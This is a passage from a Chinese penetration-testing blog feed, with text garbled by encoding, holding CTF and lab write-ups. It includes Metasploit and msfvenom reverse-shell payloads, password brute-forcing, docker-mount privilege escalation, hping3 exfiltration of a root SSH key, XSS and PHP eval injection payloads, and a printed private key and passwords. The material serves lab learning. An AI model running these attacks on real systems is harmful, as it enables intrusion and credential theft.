if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;</span><br><span class="line">        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">        $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $key2 = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key1 &amp;&amp; $key2)&#123;</span><br><span class="line">    include &quot;Hgfks.php&quot;;</span><br><span class="line">    echo &quot;You&#x27;re right&quot;.&quot;\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>açš„å€¼ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡a&#x3D;1e9ï¼Œbçš„å€¼çˆ†ç ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">for i in range(100000):</span><br><span class="line">    b=i.to_bytes(22, &#x27;big&#x27;)</span><br><span class="line">    m=hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line">    if(m[-6:]==&quot;8b184b&quot;):</span><br><span class="line">        print(i)</span><br><span class="line">        print(m)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ”»é˜²ä¸–ç•Œ</category>
      </categories>
      <tags>
        <tag>æ”»é˜²ä¸–ç•Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowè·³æ¿æœº</title>
    <url>/2023/08/08/ctfshow%E8%B7%B3%E6%9D%BF%E6%9C%BA/</url>
    <content><![CDATA[<span id="more"></span>

<p>ssh è¿æ¥ä¸Š</p>
<p>ä½¿ç”¨é‚£ä¸ªè„šæœ¬æ‰«æä¸€ä¸‹å­˜æ´»é¶æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SSH é™¤äº†å¯ä»¥è®¿é—®æœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥åˆ›å»ºåŠ å¯†éš§é“ï¼Œå……å½“ä¸¤å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åŠ å¯†è·³æ¿ï¼Œä½¿å¾—åŸæœ¬ä¸åŠ å¯†çš„é€šä¿¡å˜æˆåŠ å¯†é€šä¿¡ã€‚è¿™ä¸ªåŠŸèƒ½ç§°ä¸ºç«¯å£è½¬å‘ï¼ˆport forwardingï¼‰ï¼Œåˆç§° SSH éš§é“ï¼ˆtunnelï¼‰</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>awdå°ç»“</title>
    <url>/2023/06/11/awd%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h2 id="æ‰«æç›®æ ‡é¶æœº"><a href="#æ‰«æç›®æ ‡é¶æœº" class="headerlink" title="æ‰«æç›®æ ‡é¶æœº"></a>æ‰«æç›®æ ‡é¶æœº</h2><p>nmap</p>
<p>ç”Ÿæˆå­—å…¸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>æ‰«ææŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/æ¡Œé¢/pingtest.txt -sn</span><br></pre></td></tr></table></figure>

<h2 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h2><p>passwd</p>
<h2 id="ä¿®æ”¹æ•°æ®åº“å¯†ç "><a href="#ä¿®æ”¹æ•°æ®åº“å¯†ç " class="headerlink" title="ä¿®æ”¹æ•°æ®åº“å¯†ç "></a>ä¿®æ”¹æ•°æ®åº“å¯†ç </h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); æˆ–è€…</span><br><span class="line">update user set password = PASSWORD(&#x27;è¦æ›´æ¢çš„å¯†ç &#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privilegesï¼›</span><br><span class="line">ä¿®æ”¹å­—æ®µå†…å®¹ï¼Œä¾‹å­</span><br><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸Šä¸ªwaf"><a href="#ä¸Šä¸ªwaf" class="headerlink" title="ä¸Šä¸ªwaf"></a>ä¸Šä¸ªwaf</h2><p>ä¸‹è½½è¿æ¥</p>
<p><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p>
<p>å›åˆ°ç»ˆç«¯ï¼Œåœ¨ä¸Šä¼ çš„wafç›®å½•ä¸‹ï¼Œä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>

<p>2.è¿è¡Œwaf ä¹‹åï¼Œæ‰“å¼€æˆ‘ä»¬çš„web é¡µé¢ï¼Œåœ¨ä»»æ„ä¸€ä¸ªphp é¡µé¢åé¢è¾“å…¥<code>?watchbird=ui</code>ï¼Œå°±ä¼šè¿›å…¥    åˆ°waf é…ç½®é¡µé¢ç„¶åè®¾ç½®å¯†ç (æ³¨æ„ï¼šç¬¬ä¸€æ¬¡æ‰“å¼€éœ€è¦è®¾ç½®å¯†ç )</p>
<p>3é…ç½®å¥½ä¹‹åå°±èƒ½è¿›å…¥å†…éƒ¨ç½‘é¡µ</p>
<p>ä¸‹è½½æºç </p>
<h2 id="å‹ç¼©è§£å‹æºç "><a href="#å‹ç¼©è§£å‹æºç " class="headerlink" title="å‹ç¼©è§£å‹æºç "></a>å‹ç¼©è§£å‹æºç </h2><p>å‹ç¼©</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zcvf ~/html.tar.gz *</span><br></pre></td></tr></table></figure>

<p>è§£å‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf html.tar.gz</span><br></pre></td></tr></table></figure>

<p>ä¼ è¾“</p>
<p>dç›¾æ‰«æä¸€ä¸‹</p>
<p>æ‰¹é‡æ”»å‡»,ç”±äºè¿™ä¸ªä¸å¤ªå¥½å¤–æ”¾ï¼Œæ‰€ä»¥è‡ªè¡Œç¼–å†™å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>

<p>æ‰¹é‡æäº¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>

<h2 id="æ€ä¸æ­»é©¬ã€‚"><a href="#æ€ä¸æ­»é©¬ã€‚" class="headerlink" title="æ€ä¸æ­»é©¬ã€‚"></a>æ€ä¸æ­»é©¬ã€‚</h2><p>æ€è¿›ç¨‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pkill -u www-data</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡å‘½ä»¤åœ¨xshellå†…æ²¡æœ‰æƒé™</p>
<p>åœ¨èšå‰‘è¿›è¡Œã€‚</p>
]]></content>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>oscp2</title>
    <url>/2023/08/11/oscp2/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="SunsetNoontide"><a href="#SunsetNoontide" class="headerlink" title="SunsetNoontide"></a>SunsetNoontide</h2><p>ä¿¡æ¯æœé›†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.109 -A -sV -p-</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230811234424.png"></p>
<p>msfå¯åŠ¨ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search UnrealIRCd</span><br><span class="line">use 0</span><br><span class="line">set rhosts 192.168.56.109</span><br><span class="line">show payloads</span><br><span class="line">set payload payload/cmd/unix/reverse_perl</span><br><span class="line">show options</span><br><span class="line">...</span><br><span class="line">run</span><br><span class="line">shell</span><br><span class="line">whoami</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">su root</span><br><span class="line">root å¼±å¯†ç ç™»å½•</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<h2 id="pyexp-1"><a href="#pyexp-1" class="headerlink" title="pyexp: 1"></a>pyexp: 1</h2><p>è¿™ä¸ªé¶æœºåªèƒ½åˆvm æ‰“å¼€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.111.131 -sV -sC -A -p-</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812211640.png"></p>
<p>æ²¡æœ‰http æœåŠ¡ï¼Œé‚£å°±ä»ssh çˆ†ç ´ å’Œ mysql  çˆ†ç ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l root -P &quot;rockyou.txt&quot; mysql://192.168.111.131</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812213418.png"></p>
<p>çˆ†ç ´å‡ºæ¥å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prettywoman</span><br></pre></td></tr></table></figure>

<p>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys&#x3D;</p>
<p>å¯†é’¥ï¼šUJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0&#x3D;</p>
<p><a href="https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet">Fernet (symmetric encryption) â€” Cryptography 42.0.0.dev1 documentation</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰“å¼€python3ç»ˆç«¯ä¸€æ¬¡è¾“å…¥</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span><br><span class="line">f = Fernet(key)</span><br><span class="line">token =b&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span><br><span class="line">f.decrypt(token)</span><br><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812220514.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh lucy@192.168.111.131 -p 1337</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">sudo -l</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">import pty;pty.spawn(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="Btrsys-2"><a href="#Btrsys-2" class="headerlink" title="Btrsys-2"></a>Btrsys-2</h2><p>ä¿¡æ¯æœé›†ï¼Œå‘ç°wordpress</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.111.132/wordpress -e u</span><br></pre></td></tr></table></figure>

<p>æšä¸¾ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin admin å¼±å£ä»¤ç›´æ¥è¿›å…¥</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f raw &gt; ./shell.php</span><br></pre></td></tr></table></figure>

<p>å¼¹ä¸å‡ºæ¥ï¼Œæ­‡èœ</p>
<p>ä¸‹ä¸€ä¸ª</p>
<h2 id="pwned1"><a href="#pwned1" class="headerlink" title="pwned1"></a>pwned1</h2><p>ä¿¡æ¯æœé›†</p>
<p>å‘ç°ftp æœåŠ¡ï¼Œä½†æ˜¯å¥½åƒåŒ¿åç™»å½•ä¸äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.56.110/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hidden_text/secret.dic</span><br><span class="line">/pwned.vuln/</span><br><span class="line">æŸ¥çœ‹æºç å³å¯çœ‹åˆ°ç™»å½•è´¦å·å¯†ç </span><br></pre></td></tr></table></figure>

<p>ç™»å½•ååœ¨ç”¨æˆ·ä¸‹å‘ç°ï¼Œid_rsa ç™»å½•</p>
<p>ç„¶åèµ‹äºˆæƒé™ç™»å½•ï¼Œsudo -l,çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œ(selena) NOPASSWD: &#x2F;home&#x2F;messenger.sh</p>
<p>è¿™ä¸ªæ˜¾ç„¶æ˜¯æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name </span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">                echo &quot;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u selena /home/messenger.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815214410.png"></p>
<h3 id="docker-ææƒ"><a href="#docker-ææƒ" class="headerlink" title="docker ææƒ"></a>docker ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -v /:/mnt  -it alpine</span><br><span class="line">cd/ mnt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815220155.png"></p>
<h2 id="funbox"><a href="#funbox" class="headerlink" title="funbox"></a>funbox</h2><p>åˆ—ä¸¾ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/  -e u</span><br><span class="line">admin joe</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ -U admin -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>admin : iubire</p>
<p>joe : 12345</p>
<p>sshç™»å½• ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i ç»•è¿‡rbash</span><br></pre></td></tr></table></figure>

<p>cd &#x2F;funnyä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘ç° ./backup.sh å¯ä»¥å†™å…¥</span><br><span class="line">reminder æç¤ºä»–æ˜¯ä¸ªå®šæ—¶æ–‡ä»¶å†™å…¥åå¼¹shell</span><br><span class="line">ç›‘å¬ï¼Œå¤šè¯•å‡ æ¬¡</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230826211905.png"></p>
<h2 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h2><p>ä¿¡æ¯æœé›†å•¥ä¹Ÿæ²¡æœ‰</p>
<p>çœ‹ä¸€çœ¼ç½‘é¡µ</p>
<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001245.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">searchsploit monitorr</span><br><span class="line">searchsploit -p php/webapps/48980.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shell.php http://192.168.56.113/mon 192.168.56.105 4444</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh devel/ </span><br><span class="line">Â cat crypt.php&lt;?phpecho crypt(&#x27;BUHNIJMONIBUVCYTTYVGBUHJNI&#x27;,&#x27;da&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå³æ˜¯fox çš„å¯†ç BUHNIJMONIBUVCYTTYVGBUHJNI</p>
<p>ç™»è·¯ sudo -l</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨hping3è¯»å–rootç”¨æˆ·çš„ç§é’¥æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>è¿æ¥ä¸¤ä¸ªssh ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å‘é€ç«¯</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --data 5000 --sign signature --file /root/.ssh/id_rsa</span><br><span class="line">â€‹</span><br><span class="line">#æ¥æ”¶ç«¯</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --listen signature --safe</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ä¸ºid_rsa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqcCz/pKzjVNZi9zdKJDkvhMhY8lOb2Qth8e/3bLJ/ssgmRLoJXAQ</span><br><span class="line">sGF3lKw7MFJ4Kl6mrbod2w8EMfULTjW6OhwZ8txdNmTDkbof4irIm93oQgrqMy8/2GwF/k</span><br><span class="line">Sf84k8Yem6gRUhDDnYcKLF2Q2mBJW9WRSDImYVkZX8n/30GrUpHN7cVGCsKsuTxfZI4n3E</span><br><span class="line">fj90y0zlpUgtpdVAtOcYfhR6tXsuoKfPCD8H0N/0XEKVAHaQGWkL/EAGQqPuqGMTGLv62y</span><br><span class="line">lL8bpVdeAaol6aJdxAT3aglxOcuhdgHFAPVHeojGtIaNmpiPq0fIWZtV3gJiSRum7GBGUR</span><br><span class="line">+aWhN6ZEnn7WuOuOjibtULNadnIEyPP7xplEcoHWeeDvM060MtLx1ojv8eg23bAvd/ppsy</span><br><span class="line">UiOw2/AJGd5HnRH9yFZCXzJ+bga6oV2SH95B/pfBc0sKD5In/r4CFW+NTUH5Z3iX2dQZdo</span><br><span class="line">QnKiZjKK4aAsLcjLX3VzANr7WO6RLanxAffL0xFxAAAFiEC+3VBAvt1QAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKnAs/6Ss41TWYvc3SiQ5L4TIWPJTm9kLYfHv92yyf7LIJkS6CVwELBhd5SsOzBS</span><br><span class="line">eCpepq26HdsPBDH1C041ujocGfLcXTZkw5G6H+IqyJvd6EIK6jMvP9hsBf5En/OJPGHpuo</span><br><span class="line">EVIQw52HCixdkNpgSVvVkUgyJmFZGV/J/99Bq1KRze3FRgrCrLk8X2SOJ9xH4/dMtM5aVI</span><br><span class="line">LaXVQLTnGH4UerV7LqCnzwg/B9Df9FxClQB2kBlpC/xABkKj7qhjExi7+tspS/G6VXXgGq</span><br><span class="line">JemiXcQE92oJcTnLoXYBxQD1R3qIxrSGjZqYj6tHyFmbVd4CYkkbpuxgRlEfmloTemRJ5+</span><br><span class="line">1rjrjo4m7VCzWnZyBMjz+8aZRHKB1nng7zNOtDLS8daI7/HoNt2wL3f6abMlIjsNvwCRne</span><br><span class="line">R50R/chWQl8yfm4GuqFdkh/eQf6XwXNLCg+SJ/6+AhVvjU1B+Wd4l9nUGXaEJyomYyiuGg</span><br><span class="line">LC3Iy191cwDa+1jukS2p8QH3y9MRcQAAAAMBAAEAAAGAAiBk4NqLn0idBZCFwL1X8D2jHH</span><br><span class="line">HoJqMVou7Qq4FS4HtA9En1WIq32s3NxrIFp8xQrw8yfVioiRb+EXYlZxxrMdEqTg2OqWDH</span><br><span class="line">xmqTfazViIZWI4Wpe2yrGxX3WUEY098zP3LDIFzYZiPPX1HasqZmHwaVMal9HxAyUvmTCZ</span><br><span class="line">oP1cnRMwhjsDbp0TttpXw5W4UB0icPWoCjG9f0onAyeFGwz9uH0gAyDFct08eeXHKByCoZ</span><br><span class="line">XcEeewMC4G0Y5vrQwZFEJcEP7+FES0RHCT8itoeC51t4HOtHLX5BKcApf8cAp3LK8alEl3</span><br><span class="line">lJfLklX2Rm8v9l4RjWxxAgFpmY5o4PeXLeKP6/35VewAmMwNiZ17J/MOUMsj/2SCNxYh7Z</span><br><span class="line">LmIIL9B65ipd/L7RXSbFhpGbT6jyOYzDI8D6VGwCEhMiVITntyh5YvimgZTzlP3zmTsxX5</span><br><span class="line">lmyAn/RIJ6tXnXIkmGw1QjHfS0eI5ny+vR8SlmDnTlF1LFk65+qY42sWWeVweP4tkxAAAA</span><br><span class="line">wDvG1aNPq532hZw+P5NzrocyRSu4GfmygSpZY13OTtKGPDjQMPwABPYFOYS/cul0i9mpS1</span><br><span class="line">SeBllnDJbEwM3/iH6k/YlEuT7tIKeRbx/8MTAjkCO0sBWyA4k3tFbupsZu2/jWOxrcUgeH</span><br><span class="line">1833FdCX/EyAzBDirDopqYmR77SDERqOYLbwgv6r2J6rj4FboRemx2T1XRo+DJOczlU0yJ</span><br><span class="line">vTKQRbCFe3+Z5ZYkMg3SCvMsbu1vj+f9pu0uG84s3R3FFGYAAAAMEA0aLIF8pXABXUD+60</span><br><span class="line">bIXpizYMoodJHl02C17wBjMWVzEYah6Vq+ZvoOvqMISkeIIhDUf8jwgaFVYkv/Nr33qmSN</span><br><span class="line">FsEms4d8vJ9c8MFWykmxvmSwVh26G0DQxlASZ3exgyqmnCl9LSGwY0W4brH6nOrKRBKDTH</span><br><span class="line">xeMBxuxNdkfU6ABy5NbrSmMnQP/bLozC1GJlyB4TAvvK/PH29L8ncSzsx9KimV4eM3fv1j</span><br><span class="line">5x+VwcOnMnbzg8F1RrA5O6xJfYMnQVAAAAwQDPS88AHHxqwqg2LocOLQ6AVyqDB6IRDiDV</span><br><span class="line">mI4KG5dALS8EnHGmObVhx6qiwi09X666eDen2G/W1bVc8X9lyJVVtKEdOhLrizkPAqY3wW</span><br><span class="line">9V/kC7S2DX0aDYpVyZTSpeV63SPHCrN1jryAQMMgz+CswS7/sIqEUAPNqMAxzoziR3WBIG</span><br><span class="line">qEx5FmhFueiELGZjVJiEPAWbbsFRdskr4eYfhJ+bz91G5aJXpIJqsNw829TOXf/3439Rix</span><br><span class="line">q/qSihL6WLsu0AAAAQcm9vdEBjYWxpcGVuZHVsYQECAw==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001809.png"></p>
]]></content>
  </entry>
  <entry>
    <title>bugku</title>
    <url>/2023/06/23/bugku/</url>
    <content><![CDATA[<p> ç«‹å¿—akæ‰€æœ‰é¶æœº</p>
<span id="more"></span>

<h2 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h2><p>dirsearch æ‰«æåå‘ç°</p>
<p>admin.php,ä½†æ ¹æ®å¸ˆå‚…ä»¬çš„wp,è¿˜èƒ½æ‰«æä¸€ä¸ªdb.sql</p>
<p>é‡Œé¢æœ‰ç™»å½•å¯†ç ï¼Œä½†æˆ‘æ²¡æ‰«æï¼Œè€Œä¸”æ— æ³•è®¿é—®ä¸‹è½½</p>
<p>ç™»å½•å¯†ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!40000 ALTER TABLE `user` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `user` VALUES (1,&#x27;admin&#x27;,&#x27;011be4d65feac1a8&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `user` ENABLE KEYS */;</span><br></pre></td></tr></table></figure>

<p>åœ¨é¦–é¡µç•™è¨€æ¿è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>admin.php åˆ·æ–°å‡ æ¬¡å°±çœ‹è§äº†</p>
<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#101;&amp;#53;&amp;#51;&amp;#101;&amp;#52;&amp;#51;&amp;#48;&amp;#49;&amp;#56;&amp;#101;&amp;#56;&amp;#99;&amp;#101;&amp;#99;&amp;#48;&amp;#98;&amp;#102;&amp;#53;&amp;#57;&amp;#101;&amp;#49;&amp;#54;&amp;#102;&amp;#53;&amp;#52;&amp;#50;&amp;#56;&amp;#57;&amp;#50;&amp;#49;&amp;#97;&amp;#51;&amp;#125</span><br></pre></td></tr></table></figure>

<p>unicode è½¬ascil</p>
<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé—­åˆvar_dump: <strong>1)â€;</strong><br>ç¬¬äºŒæ­¥æ„å»ºprint_rï¼š<strong>print_r(file(â€œ.&#x2F;flag.phpâ€));</strong></p>
<p><strong>eval(â€œvar_dump(1);print_r(file(â€œ.&#x2F;flag.phpâ€)â€)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello=1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>base64è§£ç ï¼Œç„¶åurlè§£å¯†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span 